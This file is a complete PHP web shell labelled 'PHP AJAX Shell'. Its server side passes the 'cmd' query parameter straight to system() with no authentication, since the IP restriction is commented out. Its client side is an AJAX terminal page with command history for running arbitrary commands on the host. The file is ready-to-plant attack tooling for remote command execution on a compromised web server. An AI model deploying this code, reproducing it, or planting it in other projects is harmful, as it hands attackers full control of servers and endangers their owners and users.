<?php
//if ($_SERVER['REMOTE_ADDR'] !== '10.10.10.15') die();
ob_start();
if (!empty($_GET['cmd'])) {
  $ff=$_GET['cmd'];
  #shell_exec($ff);
  system($ff);
  #exec($ff);
  #passthru($ff);
} else { ?>
  <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
  <html>
  <head>
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
  <title>PHP AJAX Shell</title>
  <script type="text/javascript" language="javascript">var CommHis=new Array();var HisP;
  function doReq(_1,_2,_3){var HR=false;if(window.XMLHttpRequest){HR=new XMLHttpRequest();if(HR.overrideMimeType){HR.overrideMimeType("text/xml");}}
  else{if(window.ActiveXObject){try{HR=new ActiveXObject("Msxml2.XMLHTTP");}catch(e){try{HR=new ActiveXObject("Microsoft.XMLHTTP");}
  catch(e){}}}}if(!HR){return false;}HR.onreadystatechange=function(){if(HR.readyState==4){
  if(HR.status==200){if(_3){eval(_2+"(HR.responseXML)");}else{eval(_2+"(HR.responseText)");}}}};HR.open("GET",_1,true);HR.send(null);}
  function pR(rS){var _6=document.getElementById("outt");var _7=rS.split("\n\n");
  var _8=document.getElementById("cmd").value;_6.appendChild(document.createTextNode(_8));
  _6.appendChild(document.createElement("br"));for(var _9 in _7){var _a=document.createElement("pre");
  _a.style.display="inline";line=document.createTextNode(_7[_9]);_a.appendChild(line);_6.appendChild(_a);
  _6.appendChild(document.createElement("br"));}_6.appendChild(document.createTextNode(":-> "));_6.scrollTop=_6.scrollHeight;
  document.getElementById("cmd").value="";}function keyE(_b){switch(_b.keyCode){
  case 13:var _c=document.getElementById("cmd").value;if(_c){CommHis[CommHis.length]=_c;HisP=CommHis.length;var _d=document.location.href+"?cmd="+escape(_c);
  doReq(_d,"pR");}break;
  case 38:if(HisP>0){HisP--;document.getElementById("cmd").value=CommHis[HisP];}break;
  case 40:if(HisP<CommHis.length-1){HisP++;document.getElementById("cmd").value=CommHis[HisP];}break;default:break;}}
  </script></head><body style="font-family:courier">
  <form onsubmit="return false" style="color:#3F0;background:#000;position:relative;min-height:450px;max-height:490px">
  <div id="outt" style="overflow:auto;padding:5px;height:90%;min-height:450px;max-height:490px">:-></div>
  <input tabindex="1" onkeyup="keyE(event)" style="color:#FFF;background:#333;width:100%;" id="cmd" type="text" />
  </form>
  </body>
  </html>
<?php } ?>
